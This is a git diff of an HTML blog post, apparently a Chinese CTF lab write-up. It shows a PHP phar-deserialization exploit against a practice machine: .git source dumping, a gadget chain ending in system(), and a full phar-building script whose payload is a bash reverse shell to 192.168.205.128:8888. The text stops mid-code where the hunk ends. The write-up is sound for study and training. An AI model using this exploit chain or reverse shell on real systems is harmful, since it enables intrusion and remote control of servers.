@@ -18,7 +18,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_PHAR.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_PHAR</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -42,17 +42,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -86,34 +76,38 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
 <p>拿到靶机，先确定 IP 并扫端口。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">IP=192.168.205.199
-nmap -p0-65535 <span class="pl-smi">$IP</span></pre></div>
+<pre lang="bash"><code>IP=192.168.205.199
+nmap -p0-65535 $IP
+</code></pre>
 <p>只开了 22 和 80。Apache/2.4.67 on Debian。没什么花头，直接看 Web。</p>
-<pre class="notranslate"><code class="notranslate">PORT   STATE SERVICE
+<pre><code>PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 </code></pre>
-<p>访问 80 端口，一个简单的登录页面，标题写着 "import recovery"。随手试了 <code class="notranslate">admin:admin</code>，直接进去了。</p>
+<p>访问 80 端口，一个简单的登录页面，标题写着 &quot;import recovery&quot;。随手试了 <code>admin:admin</code>，直接进去了。</p>
 <p>登录后的页面有三个功能模块：</p>
 <ul>
 <li><strong>submit failed task</strong> — 提交一段 blob 文本，返回一个 32 位 hex 的 ID</li>
-<li><strong>repair task</strong> — 输入那个 32 hex ID，后台会"修复"并生成一个 <code class="notranslate">.bin</code> 文件</li>
+<li><strong>repair task</strong> — 输入那个 32 hex ID，后台会&quot;修复&quot;并生成一个 <code>.bin</code> 文件</li>
 <li><strong>check archive</strong> — 输入文件路径，尝试读取</li>
 </ul>
-<p>先随便玩了一下 check archive，想试试能不能读 <code class="notranslate">/etc/passwd</code>，结果返回 <code class="notranslate">not reasonable</code>。试了各种路径穿越、php filter、phar wrapper，全部被挡。我当时在这上面花了不少时间，各种编码绕过都试了，后来才意识到这条路黑盒是走不通的，得拿到源码才行。</p>
+<p>先随便玩了一下 check archive，想试试能不能读 <code>/etc/passwd</code>，结果返回 <code>not reasonable</code>。试了各种路径穿越、php filter、phar wrapper，全部被挡。我当时在这上面花了不少时间，各种编码绕过都试了，后来才意识到这条路黑盒是走不通的，得拿到源码才行。</p>
 <p>回过头来跑了一下目录扫描。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">dirsearch -q -u http://<span class="pl-smi">$IP</span></pre></div>
-<p>扫出来一个 <code class="notranslate">.git</code> 目录，完整暴露。这就不用猜了，直接拖源码。</p>
+<pre lang="bash"><code>dirsearch -q -u http://$IP
+</code></pre>
+<p>扫出来一个 <code>.git</code> 目录，完整暴露。这就不用猜了，直接拖源码。</p>
 <h1>源码还原</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">git-dumper http://<span class="pl-smi">$IP</span>/ /tmp/src</pre></div>
-<p><code class="notranslate">git-dumper</code> 在 checkout 阶段报了个错，因为 <code class="notranslate">.git</code> 结构有点怪，但 pack 文件已经下回来了。手动解包：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mkdir -p /tmp/unpack <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">cd</span> /tmp/unpack
+<pre lang="bash"><code>git-dumper http://$IP/ /tmp/src
+</code></pre>
+<p><code>git-dumper</code> 在 checkout 阶段报了个错，因为 <code>.git</code> 结构有点怪，但 pack 文件已经下回来了。手动解包：</p>
+<pre lang="bash"><code>mkdir -p /tmp/unpack &amp;&amp; cd /tmp/unpack
 git init -q
-cp /tmp/src/.git/objects/pack/<span class="pl-k">*</span>.pack <span class="pl-c1">.</span>
-git unpack-objects <span class="pl-k">&lt;</span> pack-<span class="pl-k">*</span>.pack
-GIT_DIR=<span class="pl-smi">$PWD</span>/.git git cat-file --batch-check --batch-all-objects</pre></div>
-<p>一共 11 个对象，两个 tree、一个 commit、八个 blob。逐个 <code class="notranslate">cat-file -p</code> 导出，拿到完整源码结构：</p>
-<pre class="notranslate"><code class="notranslate">config.php
+cp /tmp/src/.git/objects/pack/*.pack .
+git unpack-objects &lt; pack-*.pack
+GIT_DIR=$PWD/.git git cat-file --batch-check --batch-all-objects
+</code></pre>
+<p>一共 11 个对象，两个 tree、一个 commit、八个 blob。逐个 <code>cat-file -p</code> 导出，拿到完整源码结构：</p>
+<pre><code>config.php
 index.php
 class/Files.class.php
 class/Task.class.php
@@ -122,319 +116,346 @@ class/Myerror.class.php
 </code></pre>
 <h1>源码审计</h1>
 <h2>路由和存储</h2>
-<p><code class="notranslate">index.php</code> 是个简易前端控制器，路由白名单只有三组：User(login/logout)、Task(submit/repair)、Files(read)。</p>
-<p><code class="notranslate">config.php</code> 定义了存储路径：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-k">const</span> <span class="pl-c1">QUARANTINE</span> = <span class="pl-s">'<span class="pl-s">/var/labdata/quarantine</span>'</span>;
-<span class="pl-k">const</span> <span class="pl-c1">ARCHIVE</span>    = <span class="pl-s">'<span class="pl-s">/var/labdata/archive</span>'</span>;</pre></div>
-<p>submit 把 blob 原样写入 <code class="notranslate">quarantine/&lt;id&gt;.txt</code>，repair 读出来做一次 <code class="notranslate">rawurldecode</code> 后写入 <code class="notranslate">archive/&lt;id&gt;.bin</code>。这意味着：如果我提交时把二进制 payload 做好 URL 编码，repair 就能还原出原始字节。因为 PHP POST 解析本身也会 urldecode 一次，所以实际需要<strong>双重编码</strong>。</p>
+<p><code>index.php</code> 是个简易前端控制器，路由白名单只有三组：User(login/logout)、Task(submit/repair)、Files(read)。</p>
+<p><code>config.php</code> 定义了存储路径：</p>
+<pre lang="php"><code>const QUARANTINE = '/var/labdata/quarantine';
+const ARCHIVE    = '/var/labdata/archive';
+</code></pre>
+<p>submit 把 blob 原样写入 <code>quarantine/&lt;id&gt;.txt</code>，repair 读出来做一次 <code>rawurldecode</code> 后写入 <code>archive/&lt;id&gt;.bin</code>。这意味着：如果我提交时把二进制 payload 做好 URL 编码，repair 就能还原出原始字节。因为 PHP POST 解析本身也会 urldecode 一次，所以实际需要<strong>双重编码</strong>。</p>
 <h2>Files::read 的时序漏洞</h2>
-<p>这是整个 RCE 链的入口。<code class="notranslate">read()</code> 方法里：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-smi">self</span>::<span class="pl-s1"><span class="pl-c1">$</span>inWorker</span> = <span class="pl-c1">true</span>;
-<span class="pl-k">try</span> {
-    <span class="pl-s1"><span class="pl-c1">$</span>contents</span> = @<span class="pl-en">file_get_contents</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-smi">this</span></span>-&gt;<span class="pl-c1">filename</span>);
-} <span class="pl-k">finally</span> {
-    <span class="pl-smi">self</span>::<span class="pl-s1"><span class="pl-c1">$</span>inWorker</span> = <span class="pl-c1">false</span>;
+<p>这是整个 RCE 链的入口。<code>read()</code> 方法里：</p>
+<pre lang="php"><code>self::$inWorker = true;
+try {
+    $contents = @file_get_contents($this-&gt;filename);
+} finally {
+    self::$inWorker = false;
 }
-<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-smi">this</span></span>-&gt;<span class="pl-en">filter</span>();</pre></div>
-<p><code class="notranslate">file_get_contents</code> 在 <code class="notranslate">filter()</code> 之前执行。filter 会拦截 <code class="notranslate">://</code>、<code class="notranslate">../</code>、<code class="notranslate">/</code> 开头、<code class="notranslate">zip</code>、<code class="notranslate">flag</code> 等关键字，但拦截发生在读取之后。如果传入 <code class="notranslate">phar://</code> 路径，虽然最终会被 filter 拦下输出 <code class="notranslate">not reasonable</code>，但 phar 反序列化已经在 <code class="notranslate">file_get_contents</code> 内部触发了。</p>
+$this-&gt;filter();
+</code></pre>
+<p><code>file_get_contents</code> 在 <code>filter()</code> 之前执行。filter 会拦截 <code>://</code>、<code>../</code>、<code>/</code> 开头、<code>zip</code>、<code>flag</code> 等关键字，但拦截发生在读取之后。如果传入 <code>phar://</code> 路径，虽然最终会被 filter 拦下输出 <code>not reasonable</code>，但 phar 反序列化已经在 <code>file_get_contents</code> 内部触发了。</p>
 <h2>反序列化 Gadget 链</h2>
 <p>四个类里的魔术方法刚好能串成一条链：</p>
-<p><strong>User::__destruct</strong> — 调用 <code class="notranslate">$this-&gt;password[0]-&gt;{$this-&gt;password[1]}($this-&gt;username)</code>，相当于对任意对象调任意方法。</p>
-<p><strong>User::check</strong> — 方法体是 <code class="notranslate">echo $obj;</code>，会触发对象的 <code class="notranslate">__toString</code>。</p>
-<p><strong>Myerror::__toString</strong> — 返回 <code class="notranslate">(string) $this-&gt;message-&gt;{$this-&gt;level}</code>，访问不存在的属性会触发 <code class="notranslate">__get</code>。</p>
+<p><strong>User::__destruct</strong> — 调用 <code>$this-&gt;password[0]-&gt;{$this-&gt;password[1]}($this-&gt;username)</code>，相当于对任意对象调任意方法。</p>
+<p><strong>User::check</strong> — 方法体是 <code>echo $obj;</code>，会触发对象的 <code>__toString</code>。</p>
+<p><strong>Myerror::__toString</strong> — 返回 <code>(string) $this-&gt;message-&gt;{$this-&gt;level}</code>，访问不存在的属性会触发 <code>__get</code>。</p>
 <p><strong>Files::__get</strong> — 核心 sink：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-k">public</span> <span class="pl-k">function</span> <span class="pl-en">__get</span>(<span class="pl-s1"><span class="pl-c1">$</span>key</span>) {
-    <span class="pl-k">if</span> (<span class="pl-smi">self</span>::<span class="pl-s1"><span class="pl-c1">$</span>inWorker</span> &amp;&amp; <span class="pl-c1">.</span>.<span class="pl-c1">.</span>) {
-        (<span class="pl-s1"><span class="pl-c1">$</span>key</span>)(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-smi">this</span></span>-&gt;<span class="pl-c1">arg</span>);
+<pre lang="php"><code>public function __get($key) {
+    if (self::$inWorker &amp;&amp; ...) {
+        ($key)($this-&gt;arg);
     }
-}</pre></div>
-<p>当 <code class="notranslate">$inWorker</code> 为 true 时，直接把属性名当函数名调用。设置 <code class="notranslate">$this-&gt;level = 'system'</code>、<code class="notranslate">$this-&gt;arg = '反弹shell命令'</code>，就能 RCE。</p>
+}
+</code></pre>
+<p>当 <code>$inWorker</code> 为 true 时，直接把属性名当函数名调用。设置 <code>$this-&gt;level = 'system'</code>、<code>$this-&gt;arg = '反弹shell命令'</code>，就能 RCE。</p>
 <p>串起来就是：</p>
-<pre class="notranslate"><code class="notranslate">User1::__destruct
+<pre><code>User1::__destruct
   → User2-&gt;check(Myerror对象)
     → echo Myerror → Myerror::__toString
       → Files-&gt;system → Files::__get('system')
         → system($cmd)
 </code></pre>
 <h2>inWorker 时序问题</h2>
-<p>phar 反序列化发生在 <code class="notranslate">file_get_contents</code> 内部（<code class="notranslate">$inWorker = true</code>），但 metadata 里创建的对象直到请求结束才析构，那时候 <code class="notranslate">finally</code> 已经把 <code class="notranslate">$inWorker</code> 重置成 false 了。<code class="notranslate">Files::__get</code> 里的检查会失败。</p>
+<p>phar 反序列化发生在 <code>file_get_contents</code> 内部（<code>$inWorker = true</code>），但 metadata 里创建的对象直到请求结束才析构，那时候 <code>finally</code> 已经把 <code>$inWorker</code> 重置成 false 了。<code>Files::__get</code> 里的检查会失败。</p>
 <p>解法是利用 PHP 反序列化数组时的<strong>重复键覆盖</strong>行为。构造 metadata 为：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>meta</span> = <span class="pl-s">'<span class="pl-s">a:2:{i:0;</span>'</span> . <span class="pl-en">serialize</span>(<span class="pl-s1"><span class="pl-c1">$</span>user1</span>) . <span class="pl-s">'<span class="pl-s">i:0;N;}</span>'</span>;</pre></div>
-<p>数组键 <code class="notranslate">i:0</code> 出现两次，第二个值（<code class="notranslate">N;</code> = null）覆盖掉第一个（User1 对象）。被覆盖的 User1 立即失去引用，PHP 会在反序列化过程中就调用它的 <code class="notranslate">__destruct</code>。此时还在 <code class="notranslate">file_get_contents</code> 调用栈里，<code class="notranslate">$inWorker</code> 依然为 true。</p>
+<pre lang="php"><code>$meta = 'a:2:{i:0;' . serialize($user1) . 'i:0;N;}';
+</code></pre>
+<p>数组键 <code>i:0</code> 出现两次，第二个值（<code>N;</code> = null）覆盖掉第一个（User1 对象）。被覆盖的 User1 立即失去引用，PHP 会在反序列化过程中就调用它的 <code>__destruct</code>。此时还在 <code>file_get_contents</code> 调用栈里，<code>$inWorker</code> 依然为 true。</p>
 <h1>初始突破</h1>
 <h2>生成 phar payload</h2>
 <p>在 Kali 上创建工作目录，写 PHP 脚本生成 phar 文件：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mkdir -p /tmp/exp <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">cd</span> /tmp/exp</pre></div>
-<p>把下面内容保存为 <code class="notranslate">mk.php</code>：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
-<span class="pl-k">class</span> User { <span class="pl-k">public</span> <span class="pl-c1"><span class="pl-c1">$</span>username</span>; <span class="pl-k">public</span> <span class="pl-c1"><span class="pl-c1">$</span>password</span>; }
-<span class="pl-k">class</span> Files { <span class="pl-k">public</span> <span class="pl-k">static</span> <span class="pl-c1"><span class="pl-c1">$</span>inWorker</span> = <span class="pl-c1">false</span>; <span class="pl-k">public</span> <span class="pl-c1"><span class="pl-c1">$</span>filename</span>; <span class="pl-k">public</span> <span class="pl-c1"><span class="pl-c1">$</span>arg</span>;
-    <span class="pl-k">public</span> <span class="pl-k">function</span> <span class="pl-en">__get</span>(<span class="pl-s1"><span class="pl-c1">$</span>key</span>){
-        <span class="pl-k">if</span>(<span class="pl-smi">self</span>::<span class="pl-s1"><span class="pl-c1">$</span>inWorker</span> &amp;&amp; <span class="pl-en">is_string</span>(<span class="pl-s1"><span class="pl-c1">$</span>key</span>) &amp;&amp; <span class="pl-en">preg_match</span>(<span class="pl-s">'<span class="pl-s">/^[A-Za-z_]\w*$/</span>'</span>,<span class="pl-s1"><span class="pl-c1">$</span>key</span>)){
-            (<span class="pl-s1"><span class="pl-c1">$</span>key</span>)(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-smi">this</span></span>-&gt;<span class="pl-c1">arg</span>);
+<pre lang="bash"><code>mkdir -p /tmp/exp &amp;&amp; cd /tmp/exp
+</code></pre>
+<p>把下面内容保存为 <code>mk.php</code>：</p>
+<pre lang="php"><code>&lt;?php
+class User { public $username; public $password; }
+class Files { public static $inWorker = false; public $filename; public $arg;
+    public function __get($key){
+        if(self::$inWorker &amp;&amp; is_string($key) &amp;&amp; preg_match('/^[A-Za-z_]\w*$/',$key)){
+            ($key)($this-&gt;arg);
         }
-        <span class="pl-k">return</span> <span class="pl-s">''</span>;
+        return '';
     }
 }
-<span class="pl-k">class</span> Myerror { <span class="pl-k">public</span> <span class="pl-c1"><span class="pl-c1">$</span>message</span>; <span class="pl-k">public</span> <span class="pl-c1"><span class="pl-c1">$</span>level</span>;
-    <span class="pl-k">public</span> <span class="pl-k">function</span> <span class="pl-en">__toString</span>(){
-        <span class="pl-k">return</span> (<span class="pl-smi">string</span>)<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-smi">this</span></span>-&gt;<span class="pl-c1">message</span>-&gt;{<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-smi">this</span></span>-&gt;<span class="pl-c1">level</span>};
+class Myerror { public $message; public $level;
+    public function __toString(){
+        return (string)$this-&gt;message-&gt;{$this-&gt;level};
     }
 }
 
-<span class="pl-s1"><span class="pl-c1">$</span>cmd</span> = <span class="pl-s">'<span class="pl-s">bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1"</span>'</span>;
+$cmd = 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1&quot;';
 
-<span class="pl-s1"><span class="pl-c1">$</span>f</span> = <span class="pl-k">new</span> <span class="pl-v">Files</span>();
-<span class="pl-s1"><span class="pl-c1">$</span>f</span>-&gt;<span class="pl-c1">arg</span> = <span class="pl-s1"><span class="pl-c1">$</span>cmd</span>;
+$f = new Files();
+$f-&gt;arg = $cmd;
 
-<span class="pl-s1"><span class="pl-c1">$</span>e</span> = <span class="pl-k">new</span> <span class="pl-v">Myerror</span>();
-<span class="pl-s1"><span class="pl-c1">$</span>e</span>-&gt;<span class="pl-c1">message</span> = <span class="pl-s1"><span class="pl-c1">$</span>f</span>;
-<span class="pl-s1"><span class="pl-c1">$</span>e</span>-&gt;<span class="pl-c1">level</span> = <span class="pl-s">'<span class="pl-s">system</span>'</span>;
+$e = new Myerror();
+$e-&gt;message = $f;
+$e-&gt;level = 'system';
 
-<span class="pl-s1"><span class="pl-c1">$</span>u2</span> = <span class="pl-k">new</span> <span class="pl-v">User</span>();
-<span class="pl-s1"><span class="pl-c1">$</span>u1</span> = <span class="pl-k">new</span> <span class="pl-v">User</span>();
-<span class="pl-s1"><span class="pl-c1">$</span>u1</span>-&gt;<span class="pl-c1">username</span> = <span class="pl-s1"><span class="pl-c1">$</span>e</span>;
-<span class="pl-s1"><span class="pl-c1">$</span>u1</span>-&gt;<span class="pl-c1">password</span> = [<span class="pl-s1"><span class="pl-c1">$</span>u2</span>, <span class="pl-s">'<span class="pl-s">check</span>'</span>];
+$u2 = new User();
+$u1 = new User();
+$u1-&gt;username = $e;
+$u1-&gt;password = [$u2, 'check'];
 
-<span class="pl-s1"><span class="pl-c1">$</span>normal</span> = <span class="pl-en">serialize</span>(<span class="pl-s1"><span class="pl-c1">$</span>u1</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>meta</span> = <span class="pl-s">'<span class="pl-s">a:2:{i:0;</span>'</span> . <span class="pl-s1"><span class="pl-c1">$</span>normal</span> . <span class="pl-s">'<span class="pl-s">i:0;N;}</span>'</span>;
+$normal = serialize($u1);
+$meta = 'a:2:{i:0;' . $normal . 'i:0;N;}';
 
-@<span class="pl-en">unlink</span>(<span class="pl-s">'<span class="pl-s">/tmp/exp/x.phar</span>'</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>p</span> = <span class="pl-k">new</span> <span class="pl-v">Phar</span>(<span class="pl-s">'<span class="pl-s">/tmp/exp/x.phar</span>'</span>, <span class="pl-c1">0</span>, <span class="pl-s">'<span class="pl-s">x.phar</span>'</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>p</span>-&gt;<span class="pl-en">startBuffering</span>();
-<span class="pl-s1"><span class="pl-c1">$</span>p</span>-&gt;<span class="pl-en">setStub</span>(<span class="pl-s">"<span class="pl-s">&lt;?php __HALT_COMPILER(); ?&gt;</span>\r\n"</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>p</span>-&gt;<span class="pl-en">setSignatureAlgorithm</span>(Phar::<span class="pl-c1">SHA1</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>p</span>-&gt;<span class="pl-en">setMetadata</span>(<span class="pl-s">'<span class="pl-s">AAAAPLACEHOLDER_METADATA_AAAA</span>'</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>p</span>-&gt;<span class="pl-en">addFromString</span>(<span class="pl-s">'<span class="pl-s">a.txt</span>'</span>, <span class="pl-s">'<span class="pl-s">x</span>'</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>p</span>-&gt;<span class="pl-en">stopBuffering</span>();
+@unlink('/tmp/exp/x.phar');
+$p = new Phar('/tmp/exp/x.phar', 0, 'x.phar');
+$p-&gt;startBuffering();
+$p-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;\r\n&quot;);
+$p-&gt;setSignatureAlgorithm(Phar::SHA1);
+$p-&gt;setMetadata('AAAAPLACEHOLDER_METADATA_AAAA');
+$p-&gt;addFromString('a.txt', 'x');
+$p-&gt;stopBuffering();
 
-<span class="pl-s1"><span class="pl-c1">$</span>data</span> = <span class="pl-en">file_get_contents</span>(<span class="pl-s">'<span class="pl-s">/tmp/exp/x.phar</span>'</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>ph</span> = <span class="pl-en">serialize</span>(<span class="pl-s">'<span class="pl-s">AAAAPLACEHOLDER_METADATA_AAAA</span>'</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>pos</span> = <span class="pl-en">strpos</span>(<span class="pl-s1"><span class="pl-c1">$</span>data</span>, <span class="pl-s1"><span class="pl-c1">$</span>ph</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>lenpos</span> = <span class="pl-s1"><span class="pl-c1">$</span>pos</span> - <span class="pl-c1">4</span>;
-<span class="pl-s1"><span class="pl-c1">$</span>mlpos</span> = <span class="pl-en">strpos</span>(<span class="pl-s1"><span class="pl-c1">$</span>data</span>, <span class="pl-s">"\r\n"</span>) + <span class="pl-c1">2</span>;
-<span class="pl-s1"><span class="pl-c1">$</span>oldman</span> = <span class="pl-en">unpack</span>(<span class="pl-s">'<span class="pl-s">V</span>'</span>, <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>data</span>, <span class="pl-s1"><span class="pl-c1">$</span>mlpos</span>, <span class="pl-c1">4</span>))[<span class="pl-c1">1</span>];
+$data = file_get_contents('/tmp/exp/x.phar');
+$ph = serialize('AAAAPLACEHOLDER_METADATA_AAAA');
+$pos = strpos($data, $ph);
+$lenpos = $pos - 4;
+$mlpos = strpos($data, &quot;\r\n&quot;) + 2;
+$oldman = unpack('V', substr($data, $mlpos, 4))[1];
 
-<span class="pl-s1"><span class="pl-c1">$</span>before</span> = <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>data</span>, <span class="pl-c1">0</span>, <span class="pl-s1"><span class="pl-c1">$</span>lenpos</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>after</span> = <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>data</span>, <span class="pl-s1"><span class="pl-c1">$</span>pos</span> + <span class="pl-en">strlen</span>(<span class="pl-s1"><span class="pl-c1">$</span>ph</span>));
-<span class="pl-s1"><span class="pl-c1">$</span>newdata</span> = <span class="pl-s1"><span class="pl-c1">$</span>before</span> . <span class="pl-en">pack</span>(<span class="pl-s">'<span class="pl-s">V</span>'</span>, <span class="pl-en">strlen</span>(<span class="pl-s1"><span class="pl-c1">$</span>meta</span>)) . <span class="pl-s1"><span class="pl-c1">$</span>meta</span> . <span class="pl-s1"><span class="pl-c1">$</span>after</span>;
-<span class="pl-s1"><span class="pl-c1">$</span>delta</span> = <span class="pl-en">strlen</span>(<span class="pl-s1"><span class="pl-c1">$</span>meta</span>) - <span class="pl-en">strlen</span>(<span class="pl-s1"><span class="pl-c1">$</span>ph</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>newdata</span> = <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>newdata</span>, <span class="pl-c1">0</span>, <span class="pl-s1"><span class="pl-c1">$</span>mlpos</span>) . <span class="pl-en">pack</span>(<span class="pl-s">'<span class="pl-s">V</span>'</span>, <span class="pl-s1"><span class="pl-c1">$</span>oldman</span> + <span class="pl-s1"><span class="pl-c1">$</span>delta</span>) . <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>newdata</span>, <span class="pl-s1"><span class="pl-c1">$</span>mlpos</span> + <span class="pl-c1">4</span>);
+$before = substr($data, 0, $lenpos);
+$after = substr($data, $pos + strlen($ph));
+$newdata = $before . pack('V', strlen($meta)) . $meta . $after;
+$delta = strlen($meta) - strlen($ph);
+$newdata = substr($newdata, 0, $mlpos) . pack('V', $oldman + $delta) . substr($newdata, $mlpos + 4);
 
-<span class="pl-s1"><span class="pl-c1">$</span>body</span> = <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>newdata</span>, <span class="pl-c1">0</span>, -<span class="pl-c1">28</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>sig</span> = <span class="pl-en">sha1</span>(<span class="pl-s1"><span class="pl-c1">$</span>body</span>, <span class="pl-c1">true</span>);
-<span class="pl-s1"><span class="pl-c1">$</span>final</span> = <span class="pl-s1"><span class="pl-c1">$</span>body</span> . <span class="pl-s1"><span class="pl-c1">$</span>sig</span> . <span class="pl-en">pack</span>(<span class="pl-s">'<span class="pl-s">V</span>'</span>, <span class="pl-c1">2</span>) . <span class="pl-s">'<span class="pl-s">GBMB</span>'</span>;
-<span class="pl-en">file_put_contents</span>(<span class="pl-s">'<span class="pl-s">/tmp/exp/evil.phar</span>'</span>, <span class="pl-s1"><span class="pl-c1">$</span>final</span>);
-<span class="pl-k">echo</span> <span class="pl-en">strlen</span>(<span class="pl-s1"><span class="pl-c1">$</span>final</span>) . <span class="pl-s">"\n"</span>;</pre></div>
-<p>这里的做法是先用 Phar 类正常生成一个 phar 文件，metadata 放一个占位字符串，然后在二进制层面把占位替换成构造的恶意序列化字符串，最后重算 SHA1 签名。直接 <code class="notranslate">setMetadata</code> 没法产生重复数组键，只能手工改字节。</p>
+$body = substr($newdata, 0, -28);
+$sig = sha1($body, true);
+$final = $body . $sig . pack('V', 2) . 'GBMB';
+file_put_contents('/tmp/exp/evil.phar', $final);
+echo strlen($final) . &quot;\n&quot;;
+</code></pre>
+<p>这里的做法是先用 Phar 类正常生成一个 phar 文件，metadata 放一个占位字符串，然后在二进制层面把占位替换成构造的恶意序列化字符串，最后重算 SHA1 签名。直接 <code>setMetadata</code> 没法产生重复数组键，只能手工改字节。</p>
 <p>执行生成 phar：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">php -d phar.readonly=0 /tmp/exp/mk.php
-ls -la /tmp/exp/evil.phar</pre></div>
+<pre lang="bash"><code>php -d phar.readonly=0 /tmp/exp/mk.php
+ls -la /tmp/exp/evil.phar
+</code></pre>
 <p>确认文件生成成功。</p>
 <h2>双重编码</h2>
-<p>用 Python 对 phar 文件做两次 URL 编码，保存为 <code class="notranslate">enc.py</code> 执行：</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">urllib</span>.<span class="pl-s1">parse</span>
-<span class="pl-s1">d</span> <span class="pl-c1">=</span> <span class="pl-en">open</span>(<span class="pl-s">'/tmp/exp/evil.phar'</span>,<span class="pl-s">'rb'</span>).<span class="pl-c1">read</span>()
-<span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">quote</span>(<span class="pl-s1">d</span>, <span class="pl-s1">safe</span><span class="pl-c1">=</span><span class="pl-s">''</span>)
-<span class="pl-s1">b</span> <span class="pl-c1">=</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">quote</span>(<span class="pl-s1">a</span>, <span class="pl-s1">safe</span><span class="pl-c1">=</span><span class="pl-s">''</span>)
-<span class="pl-en">open</span>(<span class="pl-s">'/tmp/exp/body.txt'</span>,<span class="pl-s">'w'</span>).<span class="pl-c1">write</span>(<span class="pl-s1">b</span>)</pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 /tmp/exp/enc.py</pre></div>
+<p>用 Python 对 phar 文件做两次 URL 编码，保存为 <code>enc.py</code> 执行：</p>
+<pre lang="python"><code>import urllib.parse
+d = open('/tmp/exp/evil.phar','rb').read()
+a = urllib.parse.quote(d, safe='')
+b = urllib.parse.quote(a, safe='')
+open('/tmp/exp/body.txt','w').write(b)
+</code></pre>
+<pre lang="bash"><code>python3 /tmp/exp/enc.py
+</code></pre>
 <p>做个验证，确认双重解码能还原出原始 phar：</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">re</span>
-<span class="pl-k">def</span> <span class="pl-en">dec</span>(<span class="pl-s1">s</span>):
-    <span class="pl-k">return</span> <span class="pl-s1">re</span>.<span class="pl-c1">sub</span>(<span class="pl-s">r'%([0-9A-Fa-f]{2})'</span>, <span class="pl-k">lambda</span> <span class="pl-s1">m</span>: <span class="pl-en">chr</span>(<span class="pl-en">int</span>(<span class="pl-s1">m</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>),<span class="pl-c1">16</span>)), <span class="pl-s1">s</span>).<span class="pl-c1">encode</span>(<span class="pl-s">'latin-1'</span>)
-<span class="pl-s1">b</span> <span class="pl-c1">=</span> <span class="pl-en">open</span>(<span class="pl-s">'/tmp/exp/body.txt'</span>).<span class="pl-c1">read</span>()
-<span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-en">dec</span>(<span class="pl-s1">b</span>).<span class="pl-c1">decode</span>(<span class="pl-s">'latin-1'</span>)
-<span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-en">dec</span>(<span class="pl-s1">a</span>)
-<span class="pl-s1">o</span> <span class="pl-c1">=</span> <span class="pl-en">open</span>(<span class="pl-s">'/tmp/exp/evil.phar'</span>,<span class="pl-s">'rb'</span>).<span class="pl-c1">read</span>()
-<span class="pl-en">print</span>(<span class="pl-s1">r</span> <span class="pl-c1">==</span> <span class="pl-s1">o</span>)</pre></div>
-<p>输出 <code class="notranslate">True</code>，没问题。</p>
+<pre lang="python"><code>import re
+def dec(s):
